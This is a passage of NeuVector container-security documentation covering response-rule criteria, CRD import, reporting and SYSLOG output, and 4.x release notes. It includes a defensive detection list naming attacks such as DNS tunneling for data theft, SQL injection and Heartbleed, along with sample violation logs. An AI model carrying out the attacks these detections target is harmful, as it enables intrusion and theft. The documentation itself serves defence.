logEnable statusThe log Level can be used as other matching criteria  Sample events that can be chosen for a response rule​    Sample criteria for Admission control events​    Creating a response rule for cve-report category (log level and report name as matching criteria)​  Click &quot;insert to top&quot; to insert the rule at the topChoose a service group name if the rule needs to be applied to a particular service groupChoose category CVE-ReportAdd log level as matching criteria or cve-report typeSelect actions to be applied Quarantine, Webhook or suppress log (quarantine is not applicable for registry scan)Enable status  Sample CVE report types that can be chosen for CVE-Report category response rule​    Quarantine container and send webhook when vulnerability scan results contain more than 5 high level CVE vulnerabilities for that container​    Send a webhook if container contains vulnerability with name cve-2018-12​    Creating response rule for CIS benchmarks (log level and benchmark number as matching criteria)​  Click &quot;insert to top&quot; to insert the rule at the topChoose service group name if rule need to be applied for a particular service groupChoose category BenchmarkAdd log level as matching criteria or benchmark number, e.g. “5.12” Ensure the container's root filesystem is mounted as read onlySelect actions to be applied Quarantine, Webhook and suppress log (quarantine is not applicable Host Docker and Kubenetes benchmark)Enable status    Unquarantine a container by deleting response rule​  You may want to unquarantine a container if it is quarantined by a response ruleDelete the response rule which caused the container to be quarantined, which can be found in the event logSelect the unquarantine option to unquarantine the container after deleting the rule  Viewing the rule id responsible for the container quarantine (in Notifications -&gt; Events)​    Unquarantine option popup when the appropriate response rule is deleted​  Check the box to unquarantine any containers which were quarantined by this rule    Complete list of categoried criteria that can be configured for Response Rules​  Note that some criteria require a value (e.g. cve-high:1, name:D.5.4, level:critical) delimited by a colon, while others are preset and will show in the drop down when you start typing a criteria.  Events​  Container.Start Container.Stop Container.Remove Container.Secured Container.Unsecured Enforcer.Start Enforcer.Join Enforcer.Stop Enforcer.Disconnect Enforcer.Connect Enforcer.Kicked Controller.Start Controller.Join Controller.Leave Controller.Stop Controller.Disconnect Controller.Connect Controller.Lead.Lost Controller.Lead.Elected User.Login User.Logout User.Timeout User.Login.Failed User.Login.Blocked User.Login.Unblocked User.Password.Reset User.Resource.Access.Denied RESTful.Write RESTful.Read Scanner.Join Scanner.Update Scanner.Leave Scan.Failed Scan.Succeeded Docker.CIS.Benchmark.Failed Kubenetes.CIS.Benchmark.Failed License.Update License.Expire License.Remove License.EnforcerLimitReached Admission.Control.Configured // for admission control Admission.Control.ConfigFailed // for admission control ConfigMap.Load // for initial Config ConfigMap.Failed // for initial Config failure Crd.Import // for crd Config import Crd.Remove // for crd Config remove due to k8s miss Crd.Error // for remove error crd Federation.Promote // for multi-clusters Federation.Demote // for multi-clusters Federation.Join // for joint cluster in multi-clusters Federation.Leave // for multi-clusters Federation.Kick // for multi-clusters Federation.Policy.Sync // for multi-clusters Configuration.Import Configuration.Export Configuration.Import.Failed Configuration.Export.Failed Cloud.Scan.Normal // for cloud scan nomal ret Cloud.Scan.Alert // for cloud scan ret with alert Cloud.Scan.Fail // for cloud scan fail Group.Auto.Remove Agent.Memory.Pressure Controller.Memory.Pressure Kubenetes.NeuVector.RBAC Group.Auto.Promote User.Password.Alert   Incidents (Security Event)​  Host.Privilege.Escalation Container.Privilege.Escalation Host.Suspicious.Process Container.Suspicious.Process Container.Quarantined Container.Unquarantined Host.FileAccess.Violation Container.FileAccess.Violation Host.Package.Updated Container.Package.Updated Host.Tunnel.Detected Container.Tunnel.Detected Process.Profile.Violation // container Host.Process.Violation // host   Threats (Security Event)​  TCP.SYN.Flood ICMP.Flood Source.IP.Session.Limit Invalid.Packet.Format IP.Fragment.Teardrop TCP.SYN.With.Data TCP.Split.Handshake TCP.No.Client.Data TCP.Small.Window TCP.SACK.DDoS.With.Small.MSS Ping.Death DNS.Loop.Pointer SSH.Version.1 SSL.Heartbleed SSL.Cipher.Overflow SSL.Version.2or3 SSL.TLS1.0or1.1 HTTP.Negative.Body.Length HTTP.Request.Smuggling HTTP.Request.Slowloris DNS.Stack.Overflow MySQL.Access.Deny DNS.Zone.Transfer ICMP.Tunneling DNS.Type.Null SQL.Injection Apache.Struts.Remote.Code.Execution DNS.Tunneling K8S.externalIPs.MitM   Violations (Security Event)​  Network.Violation   Compliance​  Compliance.Container.Violation Compliance.ContainerFile.Violation Compliance.Host.Violation Compliance.Image.Violation Compliance.ContainerCustomCheck.Violation Compliance.HostCustomCheck.Violation Compliance.Test.Name // D.[1-5].*   CVE-Report​  ContainerScanReport HostScanReport RegistryScanReport PlatformScanReport cve-name cve-high cve-medium cve-high-with-fix // cve-high-with-fix:N (fixed high vul.&gt;N) cve-high-with-fix:N/D (fixed high vul.&gt;N and reported more than D days ago)   Admission​  Admission.Control.Allowed // for admission control Admission.Control.Violation // for admission control Admission.Control.Denied // for admission control   Dynamically Generated Criteria​  DLP WAF CustomCheckCompliance  ","version":"5.3","tagName":"h3"},{"title":"Release Notes","type":0,"sectionRef":"#","url":"/releasenotes","content":"Release Notes Here you will find a log of major changes in releases.","keywords":"","version":"5.3"},{"title":"Importing CRD from Console","type":0,"sectionRef":"#","url":"/policy/usingcrd/import","content":"","keywords":"","version":"5.3"},{"title":"Importing a CRD format file from the Console or API​","type":1,"pageTitle":"Importing CRD from Console","url":"/policy/usingcrd/import#importing-a-crd-format-file-from-the-console-or-api","content":" NeuVector supports importing a CRD formatted file from the console. However, this is not the same as applying it in Kubernetes as a custom resource definition (CRD).  A file in the NeuVector CRD format can be imported via the console in order to set the security policy (rules) specified in the file. These rules will NOT be imported as 'CRD' designated rules, but as regular 'user created' rules. The implication is that these rules can be modified or deleted like other rules, from the console or through the API. They are not protected as CRD rules from modification.  To import from the console, go to Policy -&gt; Groups and select Import Policy Group.  important Imported rules will overwrite any existing rules for the Group.  Rules that are set using the Kubernetes CRD functions, e.g. through 'kubectl apply my_crd.yaml' create CRD type rules in NeuVector which cannot be modified through the console or API. These can only be modified by updating the crd file and applying the change through Kubernetes.  Possible use cases for console import of the rules file include:  Initial (one-time) configuration of rules for a Group or groupsMigration of rules from one environment to anotherRule creation where modification is required to be allowed from the console or API. ","version":"5.3","tagName":"h3"},{"title":"Integrations & Other Components","type":0,"sectionRef":"#","url":"/releasenotes/other","content":"","keywords":"","version":"5.3"},{"title":"Release Notes for Integration Modules, Plug-Ins, Other Components​","type":1,"pageTitle":"Integrations & Other Components","url":"/releasenotes/other#release-notes-for-integration-modules-plug-ins-other-components","content":" Github Actions​  Github actions for vulnerability scanning now published at https://github.com/neuvector/neuvector-image-scan-action.  Helm Chart 1.8.9​  Helm chart v1.8.9 is published for 5.0.0 deployments. If using this with the preview version of 5.0.0 the following changes should be made to values.yml: Update the registry to docker.ioUpdate image names/tags to the preview version on Docker hubLeave the imagePullSecrets empty  Splunk App Published​  New Splunk app for NeuVector is published at https://splunkbase.splunk.com/app/6205/  Helm Chart Update 1.8.7​  Support affinity and toleration customization for controller, scanner and manager.Add nodeSelector support for Controller, Manager, Scanner, updater pods.Support user-defined environment variables for controller container.  Community Operator v1.2.7 for Helm Chart 1.8.2​  Allow users to specify NeuVector release versionDeploys latest scanner CVE db versionContainer operator image location moved to registry.neuvector.com/publicNeuVector instance name defaults to neuvector (before it was example-neuvector)Updated readme document on install page and added link to release notes  Helm Chart 1.8.2​  Add controller ingress and route host options.  Certified Operator v1.2.8 for NeuVector v4.3.1​  Supports helm chart version 1.8.2Deploys NeuVector version 4.3.1Deploys scanner db version 2.360other changes from previous 1.2.7 version neuvector instance name defaults to neuvector, before it was example-neuvectorupdated readme document on install pagecorrected NeuVector logo display issue Known issues upgrading from 1.2.7 to 1.2.8 does not upgrade scanner db work around: update scanner image to registry.connect.redhat.com/neuvector/scanner@sha256:a802c012eee80444d9deea8c4402a1d977cf57d7b2b2044f90c9acc0e7ca3e06 on scanner deploymentreadme document on install page not aligned properlyscanner db is not updated by updater  Helm Chart update 1.8.0 July 2021​  Helm Chart v1.8.0 is updated to default to registry.neuvector.com as the default registry. NOTE: Must specify the version tag manually.Add configurable parameters such as Controller API annotations in Helm chart. Available from version 1.7.6+.Community Operator 1.2.6, Certified Operator 1.2.7 updated to reflect Helm chart updates including adding OpenShift route when controller.apisvc.type is enabled.  Other Integrations July 2021​  Add HTML output format for scan results in Jenkins pipeline scanning results.Add namespace of impacted workload in Prometheus exporter alerts. Now supported in neuvector/prometheus-exporter:4.2.2 and later.  Helm Chart update 1.7.5 May 2021​  Support changes required for new image registry registry.neuvector.com. Change to this will result in image paths (ie remove neuvector from path from neuvector/controller to controller).  Helm Chart update 1.7.2 April 2021​  Add support for separate component resources requests and limits, e.g. Controller, Enforcer cpu, memory requests.  Jenkins Plug-In Update v1.13 April 2021​  Fix the scan error that exists when multiple scanners are running at the same time.Show the Red Hat vulnerability rating in the scan result for Red Hat based images.  Operator Updates April 2021​  OpenShift operator/helm to be able to replace self-signed certificates. Helm Chart is 1.7.1. Community Operator is 1.2.4, and Certified Operator is 1.2.3.  Jenkins Plug-In v1.12 March 2021​  Overwrite vulnerability severity by score. Be able to edit what vulnerability (CVE) score range is used for High and Medium classifications. This enables customizing what score can be used to fail builds in the pipeline.Add error messages to the JAVA exceptions hudson.AbortException. Enable better error message reporting from NeuVector when an error occurs.  Update Helm Chart to 1.7.1 March 2021​  Add manager service loadbalancer ip and annotations.Add setting to set pvc capacity.Add runtime socket settings for k3s and AWS bottlerocket.Add settings to replace controller and manager certificates.  Scanner February 2021​  Fix CVE-2020-1938 not discovered during scan in scanner versions 1.191 and earlier. Update to latest scanner version after 1.191.  Jenkins Plug-In v1.11 February 2021​  Enhancements​  Add support for deploying the stand alone NeuVector scanner. This does not require a controller and must be deployed on the same host as the Jenkins installation. Docker must also be installed on the host. Currently, only the Linux version of Jenkins is supported (not container version). Also, add jenkins user to the docker group.  sudo usermod -aG docker jenkins   References:https://plugins.jenkins.io/neuvector-vulnerability-scanner/https://github.com/jenkinsci/neuvector-vulnerability-scanner-plugin/releases/tag/neuvector-vulnerability-scanner-1.11  Rancher Catalog Updates January 2021​  Update NeuVector in Rancher catalog to support 4.x  Helm Chart Updates January 2021​  Create required NeuVector CRDs upon deploymentFix error when setting controller ingress to true  Operator Updates January 2021​  Update Operators (community, certified) to support 4.x  Helm Chart Changes December 2020​  Allow user to customize PriorityClass of the manager/controller/enforcer/scanner deployment. We suggest to give NeuVector containers higher priority to make sure the security policies get enforced when the node resource is under pressure or during a cluster upgrade process.  Important Helm Chart Update November 2020​  Important: Changes to Helm Chart Structure  The directory for the NeuVector chart has changed from ./neuvector-helm/ to ./neuvector-helm/charts/core/  If using Helm to upgrade, please update the location to the path above. ","version":"5.3","tagName":"h3"},{"title":"Reporting","type":0,"sectionRef":"#","url":"/reporting","content":"Reporting Reporting and Notifications","keywords":"","version":"5.3"},{"title":"Reporting & Notifications","type":0,"sectionRef":"#","url":"/reporting/reporting","content":"","keywords":"","version":"5.3"},{"title":"Reporting​","type":1,"pageTitle":"Reporting & Notifications","url":"/reporting/reporting#reporting","content":" Reports can be viewed and downloaded from several menus in the NeuVector console. The Dashboard displays a security summary which can be downloaded as a pdf. The pdf download can be filtered for a namespace if desired.    Vulnerability scanning and CIS benchmark results for registries, containers, nodes and platforms can also be downloaded as CSV files from their respective menus in the Assets menu sections.  The Security Risks menu provides advanced correlation, filtering and reporting for vulnerabilities and compliance checks. Filtered views can be exported in CSV or PDF formats.    Compliance reports for PCI, HIPAA, GDPR and other regulations can be filtered, viewed and exported by selecting the regulation in the advanced filter popup in Security Risks -&gt; Compliance.    Event Reporting​  All events such as security, admin, admission, scanning, and risk are logged by NeuVector and can be also viewed in the Console in the Notifications menu. See below for details.  Event Limits  All events are stored in memory for display in the Dashboard and Notifications screens. It is expected that events are sent via SYSLOG, webhook or other means to be stored and managed by a SIEM system. There is currently a 4K limit on each event type below:  Risk Reports (scanning, found in Notifications -&gt; Risk Reports)General Events (administration, found in the Notifications -&gt; Events)Violations (network violations, found in Notifications -&gt; Security Events)Threats (network attacks and connection issues, found in Notifications -&gt; Security Events)Incidents (process and file violations, found in Notifications -&gt; Security Events)  This is why once the limit is reached, only the most recent 4K events of that type are shown. This affects the Notifications lists are well as the displays in the Dashboard.  ","version":"5.3","tagName":"h3"},{"title":"SIEM and SYSLOG​","type":1,"pageTitle":"Reporting & Notifications","url":"/reporting/reporting#siem-and-syslog","content":" You can configure the SYSLOG server and webhook notifications in the NeuVector console in the Settings -&gt; Configuration menu. Choose the logging level, TCP or UDP, and format if json is desired. CVE data can be sent individually for each CVE and/or include layered scan results. You can also choose to send events to the controller's pod log instead of or in addition to syslog. Note that events are only sent to the lead controller's pod log.  You can then use your favorite reporting tools to monitor NeuVector events.  In addition, you can configure your syslog server through the CLI as follows:  &gt; set system syslog_server &lt;ip&gt;[:port]   The REST API can also be used for configuration.  Sample SYSLOG Output​  Network Violation  2020-01-24T21:39:34Z neuvector-controller-pod-575f94dccf-rccmt /usr/local/bin/controller 12 neuvector - notification=violation,level=Warning,reported_timestamp=1579901965,reported_at=2020-01-24T21:39:25Z,cluster_name=cluster.local,client_id=edf1c28d3411a9686e6e0374a9325b6a3626619938d3cf435a9d90075a1ef653,client_name=k8s_POD_node-pod-7c57bdbf5d-dxkn4_default_cdd9cf23-488d-439c-9408-ed98f838c67b_0,client_domain=default,client_image=k8s.gcr.io/pause:3.1,client_service=node-pod.default,server_id=external,server_name=external,server_port=80,ip_proto=6,applications=[HTTP],servers=[],sessions=1,policy_action=violate,policy_id=0,client_ip=192.168.35.69,server_ip=172.217.5.110   Process Violation  2020-01-24T21:39:29Z neuvector-controller-pod-575f94dccf-rccmt /usr/local/bin/controller 12 neuvector - notification=incident,name=Process.Profile.Violation,level=Warning,reported_timestamp=1579901965,reported_at=2020-01-24T21:39:25Z,cluster_name=cluster.local,host_id=k43:HF45:AJC6:5RYO:O5OA:KACD:KRT2:M3O6:P3VQ:IC4I:FSRD:P3HJ:ETLS,host_name=k43,enforcer_id=90822bad25eea14180c0942bf30197528bdab8c8237f307cc3059e6bbdb91f7a,enforcer_name=k8s_neuvector-enforcer-pod_neuvector-enforcer-pod-cg8jp_neuvector_d4ef187e-041c-4bc2-9cdc-c563a3feac6c_0,workload_id=d1be6d14f1f2782029d0944040ea8c0ba581991de99df86041205e15abc80209,workload_name=k8s_node-pod_node-pod-7c57bdbf5d-dxkn4_default_cdd9cf23-488d-439c-9408-ed98f838c67b_0,workload_domain=default,workload_image=nvbeta/node:latest,workload_service=node-pod.default,proc_name=curl,proc_path=/usr/bin/curl,proc_cmd=curl google.com,proc_effective_uid=1000,proc_effective_user=neuvector,client_ip=,server_ip=,client_port=0,server_port=0,server_conn_port=0,ether_type=0,ip_proto=0,conn_ingress=false,proc_parent_name=docker-runc,proc_parent_path=/usr/bin/docker-runc,action=violate,group=nv.node-pod.default,aggregation_from=1579901965,count=1,message=Process profile violation   Admission Control  2020-01-24T21:48:31Z neuvector-controller-pod-575f94dccf-rccmt /usr/local/bin/controller 12 neuvector - notification=audit,name=Admission.Control.Violation,level=Warning,reported_timestamp=1579902506,reported_at=2020-01-24T21:48:26Z,cluster_name=cluster.local,host_id=,host_name=,enforcer_id=,enforcer_name=,workload_domain=default,workload_image=nvbeta/swarm_nginx,base_os=,high_vul_cnt=0,medium_vul_cnt=0,cvedb_version=,message=Creation of Kubernetes ReplicaSet resource (nginx-pod-695cd4b87b) violates Admission Control deny rule id 1000 but is allowed in monitor mode [Notice: the requested image(s) are not scanned: nvbeta/swarm_nginx],user=kubernetes-admin,error=,aggregation_from=1579902506,count=1,platform=,platform_version=   To capture SYSLOG output:  nc -l -p 8514 -o syslog-dump.hex | tee syslog-messages.txt   Captures messages on screen, logs them to file and logs a hexdump.  Integration with Splunk​  You can integrate with Splunk using SYSLOG to capture container security events and report in Splunk.  ","version":"5.3","tagName":"h3"},{"title":"Notifications and Logs​","type":1,"pageTitle":"Reporting & Notifications","url":"/reporting/reporting#notifications-and-logs","content":" In the NeuVector Console in the Notifications menu you can find notifications for Security Events, Risk (Scanning &amp; Compliance) Events, and general system events.  Notifications can be downloaded as CSV or PDF from the Notifications menus. In addition, packet captures can be downloaded for network attacks, and vulnerability results can be downloaded from the Notifications -&gt; Risk reports menu for each scan result.  You can also display the logs using the CLI or REST API.  Security Events​  Violations are connections that violate the whitelist Rules or match a blacklist Rule. Network violations are captured and source IPs can be investigated further. Whitelist network violation events show up as &quot;Implicit Deny Rule is Violated&quot; to indicate the network connection did not match any whitelist rule.    In this view, you can review network, process, and file events and easily add a whitelist rule for false positives by clicking the Review Rule button. The Advanced Filter enables you to select the type of event to display.    NeuVector also continuously monitors all containers for know attacks such as DNS, DDoS, HTTP-smuggling, tunneling etc. When an attack is detected it is logged here and blocked (if container/service is set to protect), and the packet is automatically captured. You can view the packet details, for example:    Add New Rules for Security Events  You can easily add rules (Security Policy) to allow or deny the detected event by selecting the Review Rule button and deploying a new rule.    This is useful if false positives occur or a network/process behavior should have been discovered but did not occur during the Discover mode.  Advanced Filters  Create an advanced filter for viewing or exporting events by selecting each general type or entering keywords.  Network. Network events such as violations (implicit deny rules), threats.Process. Process whitelist violations or suspicious processes detected such as NMAP, SSH etc.Package. A package has been updated or installed in the container therefore this generated a security event.Tunnel. A tunnel violation has been detected. Tunneling, typically dns tunneling is used to steal data. This detection is done by seeing a tunnel process start and correlating it with a network activity with dns protocol. See sample event below. Description of iodine tunnel https://github.com/yarrick/iodineFile. File access violation. Either a monitored sensitive file/directory has been accessed (see list of default monitoring, or a custom file monitor rule has been triggered. https://docs.neuvector.com/policy/filerulesPrivilege. A privilege escalation has been detected in container or host. Privilege escalations can be done in many ways and are not 100% detectable so this is a difficult condition to test.  Risk Reports​  This section contains events for vulnerability scans (image, registry, run-time, container, host, platform), compliance scans (CIS benchmarks, custom scripts), and admission control events (allowed, denied).  ","version":"5.3","tagName":"h3"},{"title":"Other Integrations​","type":1,"pageTitle":"Reporting & Notifications","url":"/reporting/reporting#other-integrations","content":" NeuVector has published a Prometheus exporter with Grafana dashboard on the NeuVector github account https://github.com/neuvector/prometheus-exporter which can be customized for each installation. In addition, sample integrations with Fluentd are also available upon request.  Webhook alerts can be sent by configuring the web hook endpoint in Settings -&gt; Configuration. Then create the appropriate response rule(s) in the Policy -&gt; Response rules menu to select the type of event and the webhook as the action. ","version":"5.3","tagName":"h3"},{"title":"4.x Release Notes","type":0,"sectionRef":"#","url":"/releasenotes/4x","content":"","keywords":"","version":"5.3"},{"title":"Release Notes for 4.x​","type":1,"pageTitle":"4.x Release Notes","url":"/releasenotes/4x#release-notes-for-4x","content":" 4.4.4-s3 Security Patch April 2022​  Update all images to remediate high CVE-2022-28391 in busybox (alpine).  4.4.4-s2 Security Patch March 2022​  Update to remediate CVE-2022-0778, an OpenSSL vulnerability found in the Alpine base image used by NeuVector images. Short description: It is possible to trigger an infinite loop by crafting a certificate that has invalid elliptic curve parameters. Since certificate parsing happens before verification of the certificate signature, any process that parses an externally supplied certificate may be subject to a denial of service attack. More details can be found at the following links. https://security.alpinelinux.org/vuln/CVE-2022-0778https://www.suse.com/security/cve/CVE-2022-0778.htmlhttps://nvd.nist.gov/vuln/detail/CVE-2022-0778  4.4.4-s1 Security Patch February 2022​  Update alpine in Manager to remove recent CVEs including High ratings CVE-2022-25235, CVE-2022-25236 and CVE-2022-25314Note: Recent CVEs have also been published in the Manager CLI module related to the python package. The python package will be replace in the 5.0 version with python3 to remove any CVEs. This is currently scheduled for GA in May 2022. The CLI is not remotely accessible and can't be accessed through the GUI, so proper Kubernetes RBACs to restrict 'kubectl exec' commands into the Manager pod will protect against exploits.List of manager 4.4.4 CVEs alpine:3.15.0 High CVE-2022-25235 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25235 expatalpine:3.15.0 High CVE-2022-25236 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25236 expatalpine:3.15.0 Medium CVE-2022-25313 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25313 expatalpine:3.15.0 High CVE-2022-25314 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25314 expatalpine:3.15.0 High CVE-2022-25315 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25315 expatalpine:3.15.0 Medium CVE-2020-26137 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26137 usr/lib/python2.7/site-packages/urllib3-1.25.3alpine:3.15.0 High CVE-2020-7212 https://github.com/advisories/GHSA-hmv2-79q8-fv6g usr/lib/python2.7/site-packages/urllib3-1.25.3alpine:3.15.0 High CVE-2021-33503 https://github.com/advisories/GHSA-q2q7-5pp4-w6pg usr/lib/python2.7/site-packages/urllib3-1.25.3alpine:3.15.0 Medium CVE-2021-3572 https://github.com/advisories/GHSA-5xp3-jfq3-5q8x usr/lib/python2.7/site-packages/pip-20.3.4  Other Updates February 2022​  Update Helm chart to 1.9.1. Allow users to specify different image SHA hash instead of tags, add support for k3s in Rancher UI.Community Operator is updated to 1.3.5 to support 4.4.4.Certified Operator is updated to to 1.3.2 to support 4.4.4.  4.4.4 February 2022​  Enhancements​  Add environment variable for Enforcer to turn off secrets scanning, which in some environments can consume resources. Set to ENF_NO_SECRET_SCANS=1In Vulnerability Explorer &gt; CSV download, show affected containers in multiple rows instead of in the same cell.  Bug Fixes​  Reduce secrets scanning by Enforcer to avoid possibility of long running scanning tasks which can consume memory. This may be caused by large image registry or database scan locally.Fix bug when attempting to export CSV for CVE's found in the vulnerability explorer Security Risks -&gt; Vulnerabilities without using filter, the CSV file is empty.Fix timing issue when upgrading from 4.2.2 which can result in implicit deny for all traffic. Most recent fix is related to XFF settings during rolling updates.  Other​  Allow users to specify different image SHA hash instead of tags https://github.com/neuvector/neuvector-helm/pull/140. Will be propagated to Operator.  4.4.3 January 2022​  Enhancements​  Replace the self-signed certificate for Manager which is expiring January 23, 2022 with new one expiring Jan. 2024.Improve ability to display unmanaged workloads in Network Activity map which are not relevant.  Bug Fixes​  Fix Controller crashes when scanning gitlab registry.Admission control not blocking for some images. This is because a vulnerability found in multiple packages is treated as 1 vulnerability in Controller's admission control and is fixed.Upgrade from 4.2.2 to 4.3.2 results in implicit deny for all traffic if high traffic during rolling upgrade.  Other​  Helm chart v1.8.9 is published for 5.0.0 deployments.  4.4.2 December 2021​  Enhancements​  Add support for scanning embedded java jars and jars without Maven file, for example log4j-core-2.5.jar, when pom.xml doesn’t exist.Add CVE database source of GitHub advisories for Maven, starting with scanner/CVE db version 2.531.Rest API reference doc is updated to 4.4.1 and 4.4.2.  Bug Fixes​  Fix memory leak detected in Enforcer.  4.4.1 December 2021​  Enhancements​  Add support for cgroup v2, which is required for some environments such as SUSE Linux Enterprise Server 15 SP3.  Bug Fixes​  Fix the issue where Enforcer is unable to detect CVE-2021-44228 in running containers.Reduce/fix high memory usage by Enforcer for some environments.Fix an issue with import/export of nv.ip group policy.Fix issue with removing a group with no container members.Fix issue of can't login using neuvector-prometheus-exporter intermittently.Fix issue with REST API endpoint /v1/response/rule?scope=local not deleting all response rules.  Helm Chart Update 1.8.7​  Support affinity and toleration customization for controller, scanner and manager.Add nodeSelector support for Controller, Manager, Scanner, updater pods.Support user-defined environment variables for controller container.  Splunk App Published​  New Splunk app for NeuVector is published at https://splunkbase.splunk.com/app/6205/  4.4.0 December 2021​  Enhancements​  Add ability to 'Accept' a vulnerability (CVE) to exclude it from reports, views, risk scoring etc. A vulnerability can be selected and the Accept button clicked from several screens such as Security Risks -&gt; Vulnerabilities, Assets -&gt; Containers etc. Once accepted, it is added to the Security Risks -&gt; Vulnerability Profile list. It can be viewed, exported, and edited here. Note that this Accept feature can be limited to listed Images and/or Namespaces. New entries can also be added manually to this list from this screen.Enable a Configuration Assessment of a kubernetes deployment yaml file. Upload a yaml file from Policy -&gt; Admission Control and it will be reviewed against all Admission Control rules to see if it will hit any rules. A report of the assessment can be downloaded from this window.  Bug Fixes​  Fixed packet capture is not available for pod with istio sidecar proxy.Remove writing by Allinone to /dev/null.json  4.3.2-s1 November 2021​  Security patch release that addresses vulnerabilities in 'curl' related libraries discovered in the 4.3.2 release. The discovered CVE are CVE-2021-22945, CVE-2021-22946 and CVE-2021-22947.  4.3.2 September 2021​  Enhancements​  Support Openshift CIS benchmark 1.0.0 and 1.1.0.Support admission control dry-run option.Improve description of the source of admission control criteria. Improve labels criteria in admission control to add other criteria.Support gitlab cloud (SaaS) registry scan.Support multi-architecture image scan.ConfigMap override option to reset config whenever controller starts. The 'always_reload: true' can be used in any configMap yaml to force reload of that yaml every time the controller starts.Include pre-built PSP best practices admission control rules.Test support for AppArmor profile for running NeuVector as non-privileged containers.Allow users to click Group name in Security events list to go to the Policy -&gt; Groups selection.  Bug Fixes​  Add indicator for admission control criterion to determine if scan result is required.Warning if all NeuVector components are not running the same version.Show Docker Swarm/Mirantis platform in Network Activity -&gt; View -&gt; Show System. This is enabled by adding the environment variable for the Enforcer NV_SYSTEM_GROUPS.  Other​  Update cronjob version in helm chart (v. 1.8.3).Support Jenkins master-slave configuration in Jenkins plug-in.  4.3.1 August 2021​  Enhancements​  Display node labels under Assets -&gt; Nodes.Display statistics for the Controller in Assets -&gt; System ComponentsReport if a vulnerability is in the base image layers in image scan when using the REST API to scan images. The base image must be identified in the api call, as in the example below.  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;https://registry.hub.docker.com/&quot;, &quot;repository&quot;: &quot;garricktam/debian&quot;, &quot;tag&quot;: &quot;latest&quot;, &quot;scan_layers&quot;: false, &quot;base_image&quot;: &quot;2244...../nodejs:3.2......&quot;}}' &quot;https://$RESTURL/v1/scan/repository&quot; {noformat}   Limitations: If the image to be scanned is a remote image, with &quot;registry&quot; specified, the base image must also be a remote image, and the name must start with http or https.If the image to be scanned is a local image, then the base image must also be a local image as well. For example,  {&quot;request&quot;: {&quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.2&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;alpine:3.12.0&quot;}} {&quot;request&quot;: {&quot;registry&quot;: &quot;https://10.1.127.12:5000/&quot;, &quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.0&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;https://registry.hub.docker.com/alpine:3.12.0&quot;}} {&quot;request&quot;: {&quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.2&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;10.1.127.12:5000/neuvector/manager:4.0.2”}}   Bug Fixes​  Make enforcer list height adjustable.Sanitize all displayed fields to prevent XSS attacks.  4.3 July 2021​  Enhancements​  New Network Activity display in console improved performance and object icon design. New UI framework dramatically improves loading times for thousands of objects to be displayed. Session filters are maintained until logout in Network Activity, Security Risks and other menu's. GPU acceleration is enabled, which can be disabled if this causes display issues. Note: Known issue with certain Window's PCs with GPU enabled.Add ability to import Group Policy (CRD file yaml format) from console to support non-Kubernetes environments. Important: Imported CRDs from console do NOT get classified and displayed as CRD rules. They can be edited through the console, unlike CRD's applied through Kubernetes.Support multiple web hook endpoints. In Settings -&gt; Configuration, multiple web hook endpoints can be added. In Response Rules, creating a rule enables user to select which end point(s) to notify by web hook.Support (multiple web hook) configuration in Federated rules.Support JSON format for web hooks. Can now configure JSON, key-value pairs, or Slack as web hook formats when creating a web hook.Support custom user roles for map to a namespace user. Directory integration support mapping of groups to roles, with role being able to limit to namespace(s). Limitation: If the user is in multiple groups, the role will be 'first matched' group's role assigned. Please the order of configuration for proper behavior.Download list of external IPs for egress connections. Added ability to download report/CSV from the Dashboard page under section Ingress and Egress Exposure.Support cve-medium criteria in Response Rules.Add preconfigured PSP Best Practice rule to Admission Control rules. For example the following preset criteria can alert/block a deployment: Run as Privileged, Run as Root, Share host's IPC Namespaces = true, Share host's Network = true, Share host's PIC Namespaces = true.Support using Namespace in Advanced Filter for Security Risks Vulnerabilities &amp; Compliance for Assets report in PDF.Support Admission Control rule criteria based on CVE score.Add a Test Registry button when configuring registry scanning for registries that support this feature such as docker and JFrog.Improve support log download and controller debug settings. Enable download settings such as cPath and which component logs are downloaded.Add support for Kubernetes 1.21.  Bug Fixes​  Support Kubernetes 1.21 with containerd 1.4.4. The containerd run-time v1.4.4 changes its cgroup representations.Scanner identifies OS as ol:7.9 with false positive CVEs.Support standalone scanner deployment on Azure DevOps extension.  Other Changes​  Helm Chart v1.8.0 is updated to default to registry.neuvector.com as the default registry. NOTE: Must specify the version tag manually.Add configurable parameters such as Controller API annotations in Helm chart. Available from version 1.7.6+.Community Operator 1.2.6, Certified Operator 1.2.7 updated to reflect Helm chart updates including adding OpenShift route when controller.apisvc.type is enabled. The certified Operator 1.2.7 deploys NeuVector version 4.2.2.Add HTML output format for scan results in Jenkins pipeline scanning results.Add namespace of impacted workload in Prometheus exporter alerts. Now supported in neuvector/prometheus-exporter:4.2.2 and later.  4.2.2 April 2021​  Enhancements​  Enable enforcement of a password policy. If this feature is enabled, passwords must meet minimum security requirements configured. Go to Settings - User/Roles to set the password policy, including minimum characters, upper case, numeric, and special characters required. Guessing and password reuse are also prevented.Allow slash in key/value in CRD group definition.Enhance SAML to support CAC authentication. SAML AFDS Common Access Card (CAC) authentication method.Verify compatibility with OpenShift 4.7  Bug Fixes​  Fix the condition where Enforcer is delaying node reboot for up to 20 minutes on OpenShift update.Correct Unmanaged node terminology to be 'nodes'.CRD import produced unexpected results. A conversion tool is available from NeuVector to help convert from previous releases CRD format.In AKS webhook certificates created without SAN for k8s v1.19+.Federated policy working inconsistently and not as expected. Improve unmanaged workload ip logic to reduce unnecessary violations.  4.2.1 March 2021​  Bug Fixes​  Predefined File Access rules are not displaying in console.Column headers are incorrect in several console views such as Assets-&gt;Registry-&gt;Module Scan Results. Some PDF reports were also affected and have been fixed. Other areas primarily in Sonatype build have been 